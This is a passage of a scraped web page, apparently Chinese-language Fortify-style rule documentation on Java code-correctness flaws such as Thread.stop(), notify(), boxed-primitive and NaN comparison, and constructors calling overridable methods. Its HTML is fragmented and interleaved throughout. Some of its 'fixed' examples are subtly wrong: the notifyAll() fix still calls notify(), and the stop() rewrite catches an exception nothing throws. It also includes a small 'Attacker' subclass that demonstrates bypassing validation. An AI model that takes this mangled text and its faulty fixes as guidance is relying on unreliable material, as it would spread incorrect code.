class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  thr.start();</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] THI00-J. Do not invoke Thread.run() CERT</span><br><span class="line"></span><br><span class="line">[2] Standards Mapping - Common Weakness Enumeration CWE ID 572</span><br><span class="line"></span><br><span class="line">[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</span><br><span class="line"></span><br><span class="line">[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</span><br><span class="line"></span><br><span class="line">[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[16] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</span><br><span class="line"></span><br><span class="line">[17] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Call to Thread.stop()</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">程序调用了线程的 stop() 方法，这可能会导致资源泄露。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">在多数情况下，直接调用 Thread 对象的 stop() 方法会是一个 bug。程序员希望阻止线程运行，但是没有意识到这种阻止线程的方式并不合适。Thread 中的 stop() 函数会导致 Thread 对象中的任意位置出现 ThreadDeath 异常，这可能会导致对象出现不一致状态，并且会泄露资源。由于此 API 本质上并不安全，因此很久以前就已弃用。</span><br><span class="line"></span><br><span class="line">示例 1：以下内容摘录自 Java 程序，其错误地调用了 Thread.stop()。</span><br></pre></td></tr></table></figure>
<p>  …</p>
<p>  public static void main(String[] args){</p>
<pre><code>...

Thread thr = new Thread() {

  public void run() {

    ...

  }

};

...

thr.start();

...

thr.stop();

...
</code></pre><p>  }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">依据不同的实施方式，该解决方法会有所不同，但可能意味着要等待线程终止、使用中断或使用可变的变量来指示是否应继续执行线程，或者结合这几种做法。</span><br><span class="line"></span><br><span class="line">示例 2：示例 1 中的代码可以通过以下方式进行重新编写：</span><br></pre></td></tr></table></figure></p>
<p>  …</p>
<p>  private static volatile boolean checker = true;</p>
<p>  public static void main(String[] args){</p>
<pre><code>...

Thread thr = new Thread() {

  public void run() {

    while (checker){

      //do something

    }

  }

};



thr.start();

try {

  ...

  stop();

}catch (InterruptedException e){

  //cleanup

}
</code></pre><p>  }</p>
<p>  private static void stop(){</p>
<pre><code>checker = false;
</code></pre><p>  }</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">此处我们指定了一个标记，以在线程中循环任务时始终执行检查。我们需要确保将标记指定为 volatile，或者必须确保同步变量访问，否则，该代码可能会导致循环的运行次数过多，或者在某些情况下导致其成为无限循环。</span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] THI05-J. Do not use Thread.stop() to terminate threads CERT</span><br><span class="line"></span><br><span class="line">[2] Why are Thread.stop, Thread.suspend, Thread.resume and Runtime.runFinalizersOnExit Deprecated? Oracle</span><br><span class="line"></span><br><span class="line">[3] Standards Mapping - Common Weakness Enumeration CWE ID 572</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</span><br><span class="line"></span><br><span class="line">[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</span><br><span class="line"></span><br><span class="line">[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</span><br><span class="line"></span><br><span class="line">[7] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[8] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[9] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[10] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[11] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[12] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[13] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[17] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</span><br><span class="line"></span><br><span class="line">[18] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Call to notify()</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">调用 notify() 时将唤醒哪个线程并不确定。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">通过调用 notify() 无法指定将唤醒哪个线程。</span><br><span class="line"></span><br><span class="line">例 1：在下列代码中，notifyJob() 调用 notify()。</span><br></pre></td></tr></table></figure>
<p>public synchronized notifyJob() {</p>
<p>flag = true;</p>
<p>notify();</p>
<p>}</p>
<p>…</p>
<p>public synchronized waitForSomething() {</p>
<p>while(!flag) {</p>
<pre><code>try {

    wait();

}

catch (InterruptedException e)

{

    ...

}
</code></pre><p>}</p>
<p>…</p>
<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在这种情况下，开发人员希望唤醒调用 wait() 的线程，但是 notify() 可能会通知另外的线程。</span><br><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">使用 notifyAll() 而不是 notify()。除非您的应用程序高度并行且每个线程都执行类似的操作，否则不应使用 notify()。</span><br><span class="line"></span><br><span class="line">例 2：在下列代码中，notifyJob() 调用 notifyAll()。</span><br></pre></td></tr></table></figure></p>
<p>public synchronized notifyJob() {</p>
<p>flag = true;</p>
<p>notify();</p>
<p>}</p>
<p>…</p>
<p>public synchronized waitForSomething() {</p>
<p>while(!flag) {</p>
<pre><code>try {

    wait();

}

catch (InterruptedException e)

{

...

}
</code></pre><p>}</p>
<p>…</p>
<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此处对 notifyAll() 的调用可确保将会通知调用了 wait() 的线程。</span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] Sun Microsystems, Inc. Java Sun Tutorial - Concurrency</span><br><span class="line"></span><br><span class="line">[2] Sun Microsystems, Inc. Java Sun Tutorial - Concurrency</span><br><span class="line"></span><br><span class="line">[3] THI02-J. Notify all waiting threads rather than a single thread CERT</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - Common Weakness Enumeration CWE ID 373</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Class Does Not Implement Cloneable</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">这个类实现了 clone() 方法，但没有实现 Cloneable 接口。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">程序员似乎原本想要这个类实现 Cloneable 接口，因为它已经实现了一个名称为 clone() 的方法。然而，该类并没有实现 Cloneable 接口，同时 clone() 方法也无法正常运行。</span><br><span class="line"></span><br><span class="line">例 1：在这个类中，调用 clone() 方法将导致一个 CloneNotSupportedException. 异常</span><br></pre></td></tr></table></figure></p>
<p>public class Kibitzer {</p>
<p>  public Object clone() throws CloneNotSupportedException {</p>
<pre><code>...
</code></pre><p>  }</p>
<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">应同时实现 Cloneable 接口和 clone() 方法。</span><br><span class="line"></span><br><span class="line">例 2： 例 1 中的代码应该用以下方式重写：</span><br></pre></td></tr></table></figure></p>
<p>public class Kibitzer implements Cloneable {</p>
<p>  public Object clone() throws CloneNotSupportedException {</p>
<pre><code>...
</code></pre><p>  }</p>
<p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] Standards Mapping - Common Weakness Enumeration CWE ID 498</span><br><span class="line"></span><br><span class="line">[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</span><br><span class="line"></span><br><span class="line">[3] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</span><br><span class="line"></span><br><span class="line">[5] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[6] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[11] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</span><br><span class="line"></span><br><span class="line">[12] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[13] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[14] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</span><br><span class="line"></span><br><span class="line">[15] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</span><br><span class="line"></span><br><span class="line">[16] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Comparison of Boxed Primitive Types</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">如果使用相等运算符而非其 equals() 方法比较框式基元，可能会导致意外行为。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">在处理框式基元时，如果需要比较相等性，则应调用框式基元的 equals() 方法，而非使用运算符 == 和 !=。Java 规范具有关于框式转换的如下说明：</span><br><span class="line"></span><br><span class="line">“如果框式值 p 是一个整数文本（例如 -128 和 127 之间的整数），或是布尔文本 true 或 false，或者是 &apos;\u0000&apos; 和 &apos;\u007f&apos; 之间的字符文本，则使 a 和 b 作为 p 的任意两个框式转换值的结果。结果始终会是 a == b。”</span><br><span class="line"></span><br><span class="line">这意味着，如果使用了框式基元（并非 Boolean 或 Byte），则仅会缓存或记住一个值区间。对于值的子集，使用 == 或 != 会返回正确的值，而对于此子集外的所有其他值，将返回对象地址的比较结果。</span><br><span class="line"></span><br><span class="line">示例 1：以下示例对框式基元使用相等运算符。</span><br></pre></td></tr></table></figure></p>
<p>  …</p>
<p>  Integer mask0 = 100;</p>
<p>  Integer mask1 = 100;</p>
<p>  …</p>
<p>  if (file0.readWriteAllPerms){</p>
<pre><code>mask0 = 777;
</code></pre><p>  }</p>
<p>  if (file1.readWriteAllPerms){</p>
<pre><code>mask1 = 777;
</code></pre><p>  }</p>
<p>  …</p>
<p>  if (mask0 == mask1){</p>
<pre><code>//assume file0 and file1 have same permissions

...
</code></pre><p>  }</p>
<p>  …<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以上代码使用了框式基元 Integer 以尝试比较两个 int 值。如果 mask0 和 mask1 都等于 100，则 mask0 == mask1 将返回 true。但是，如果 mask0 和 mask1 都等于 777，则 mask0 == maske1 将返回 false，因为这些值不在这些框式基元的缓存值范围内。</span><br><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">大多数情况下，由于开发人员并不希望比较框式基元的地址，因此应使用框式基元的 equals() 方法，而非相等运算符。或者，可以重新编写等式，以使用其他比较运算符（如 &lt;、&gt;、⇐ 或 &gt;=），因为这些运算符会引导对基元值进行自动分框。</span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] EXP03-J. Do not use the equality operators when comparing values of boxed primitives CERT</span><br><span class="line"></span><br><span class="line">[2] Java Language Specification Chapter 5. Conversions and Contexts Oracle</span><br><span class="line"></span><br><span class="line">[3] Standards Mapping - Common Weakness Enumeration CWE ID 398, CWE ID 754</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 754</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Comparison with NaN</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">与 NaN 进行比较始终是一种错误方式。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">如果与 NaN 进行比较，得出的计算结果将始终为 false（!= 运算符是个例外，因为 NaN 未经排序，所以始终会得出 true 结果）。</span><br><span class="line"></span><br><span class="line">示例 1：以下示例尝试验证变量并非为 NaN。</span><br></pre></td></tr></table></figure></p>
<p>  …</p>
<p>  if (result == Double.NaN){</p>
<pre><code>//something went wrong

throw new RuntimeException(&quot;Something went wrong, NaN found&quot;);
</code></pre><p>  }</p>
<p>  …</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这将尝试验证 result 并非 NaN，但是使用带有 NaN 的运算符 == 将始终得出 false 值，所以此检查将永远不会抛出异常。</span><br><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">如果需要检查数值是否为 NaN，则应使用 java.lang.Double.isNaN() 函数。如果不确定在运行时该值会有何种变化，在使用任何运算符进行比较之前，也需要对其进行验证。</span><br><span class="line"></span><br><span class="line">示例 2：以下示例修复了示例 1 中的代码。</span><br></pre></td></tr></table></figure>
<p>  …</p>
<p>  if (java.lang.Double.isNaN(result)){</p>
<pre><code>//something went wrong

throw new RuntimeException(&quot;Something went wrong, NaN found&quot;);
</code></pre><p>  }</p>
<p>  …</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] NUM07-J. Do not attempt comparisons with NaN CERT</span><br><span class="line"></span><br><span class="line">[2] Java Language Specification Chapter 4. Types, Values and Variables Oracle</span><br><span class="line"></span><br><span class="line">[3] INJECT-9: Prevent injection of exceptional floating point values Oracle</span><br><span class="line"></span><br><span class="line">[4] Standards Mapping - Common Weakness Enumeration CWE ID 486</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Constructor Invokes Overridable Function</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">类的构造函数调用了可被覆盖的函数。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">如果构造函数调用了可覆盖的函数，则在该对象完全初始化之前，攻击者将可以访问 this 引用，进而导致出现漏洞。</span><br><span class="line"></span><br><span class="line">示例 1：以下示例调用了可覆盖的方法。</span><br></pre></td></tr></table></figure>
<p>  …</p>
<p>  class User {</p>
<pre><code>private String username;

private boolean valid;

public User(String username, String password){

  this.username = username;

  this.valid = validateUser(username, password);

}

public boolean validateUser(String username, String password){

  //validate user is real and can authenticate

  ...

}

public final boolean isValid(){

  return valid;

}
</code></pre><p>  }</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于函数 validateUser 和该类并非 final，这意味着它们是可以被覆盖的，对将覆盖此该函数的子类的变量执行初始化会允许避开 validateUser 功能。例如：</span><br></pre></td></tr></table></figure>
<p>  …</p>
<p>  class Attacker extends User{</p>
<pre><code>public Attacker(String username, String password){

  super(username, password);

}

public boolean validateUser(String username, String password){

  return true;

}
</code></pre><p>  }</p>
<p>  …</p>
<p>  class MainClass{</p>
<pre><code>public static void main(String[] args){

  User hacker = new Attacker(&quot;Evil&quot;, &quot;Hacker&quot;);

  if (hacker.isValid()){

    System.out.println(&quot;Attack successful!&quot;);

  }else{

    System.out.println(&quot;Attack failed&quot;);

  }

}
</code></pre><p>  }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以上代码输出了 “Attack successful!”，因为 Attacker 类覆盖了从子类 User 的构造函数调用的函数 validateUser()，Java 将首先在该子类中查找该构造函数调用的函数。</span><br><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">构造函数不应调用可覆盖的函数，无论是通过将该函数指定为 final，还是将该类指定为 final 的方式。或者，如果此代码仅在构造函数中才需要，则可使用访问说明符 private，或直接将逻辑放在子类的构造函数中。</span><br><span class="line"></span><br><span class="line">示例 2：以下示例创建了类 final，以防止该函数在其他位置被覆盖。</span><br></pre></td></tr></table></figure></p>
<p>  …</p>
<p>  final class User {</p>
<pre><code>private String username;

private boolean valid;

public User(String username, String password){

  this.username = username;

  this.valid = validateUser(username, password);

}

private boolean validateUser(String username, String password){

  //validate user is real and can authenticate

  ...

}

public final boolean isValid(){

  return valid;

}
</code></pre><p>  }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此示例将该类指定为 final，以便无法为其创建子类，由于此应用程序的其他位置也需要 validateUser() 函数，所以已将其更改为 private。这是通过防御的方式进行编程，因为未来可能需要为 User 类创建子类，如果未将 validateUser() 函数设置为 private，则会导致此漏洞再次出现。</span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] MET05-J. Ensure that constructors do not call overridable methods CERT</span><br><span class="line"></span><br><span class="line">[2] EXTEND-5: Limit the extensibility of classes and methods Oracle</span><br><span class="line"></span><br><span class="line">[3] OBJECT-4: Prevent constructors from calling methods that can be overridden Oracle</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Erroneous Class Compare</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">根据对象的类名称确定对象类型会导致意外行为或致使攻击者注入恶意的类。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">为了使程序执行恶意代码，攻击者可能会蓄意复制类名。正是这个原因，类名并不是好的类型标识符，因此不应当作授予信任的依据，用到指定的对象中。</span><br><span class="line"></span><br><span class="line">例 1：以下代码基于类名从 inputReader 对象中选择信任或不信任的输入。如果攻击者能提供执行恶意命令的 inputReader 的实现方法，该代码便无法区分对象是否是恶意版本。</span><br></pre></td></tr></table></figure></p>
<p>if (inputReader.getClass().getName().equals(“TrustedName”))</p>
<p>{</p>
<p>   input = inputReader.getInput();</p>
<p>   …</p>
<p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">务必使用等类比较来识别对象的类型。不要依靠类名来传达类型信息。</span><br><span class="line"></span><br><span class="line">例 2：以下代码已被重写，以便采用等类比较确定 inputReader 对象是否存在要求的类型。</span><br></pre></td></tr></table></figure>
<p>if (inputReader.getClass() == TrustedClass)</p>
<p>{</p>
<p>   input = inputReader.getInput();</p>
<p>   …</p>
<p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] OBJ09-J. Compare classes and not class names CERT</span><br><span class="line"></span><br><span class="line">[2] INPUT-1: Validate inputs Oracle</span><br><span class="line"></span><br><span class="line">[3] Standards Mapping - Common Weakness Enumeration CWE ID 486</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Erroneous Negative Value</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">一个字段被错误地分配了负值。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">此字段被标注为 FortifyNonNegative，表示不允许使用负值。</span><br><span class="line"></span><br><span class="line">##### RECOMMENDATIONS</span><br><span class="line"></span><br><span class="line">确保无法将负值分配给带注释的字段。</span><br><span class="line"></span><br><span class="line">##### REFERENCES</span><br><span class="line"></span><br><span class="line">[1] Standards Mapping - Common Weakness Enumeration CWE ID 20</span><br><span class="line"></span><br><span class="line">[2] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 020</span><br><span class="line"></span><br><span class="line">#### Code Correctness: Erroneous String Compare</span><br><span class="line"></span><br><span class="line">##### ABSTRACT</span><br><span class="line"></span><br><span class="line">进行字符串对比时，应采用 equals() 方法，而不是== 或 != 方法。</span><br><span class="line"></span><br><span class="line">##### EXPLANATION</span><br><span class="line"></span><br><span class="line">程序采用 == 或 != 来比较两个字符串是否相等，其实质比较的是两个对象，而不是字符串的值。因此，若采用这个方法，两个引用将永远不会相等。</span><br><span class="line"></span><br><span class="line">例 1：以下分支语句将永远不会被执行。</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">if (args[0] == STRING_CONSTANT) &#123;</span><br><span 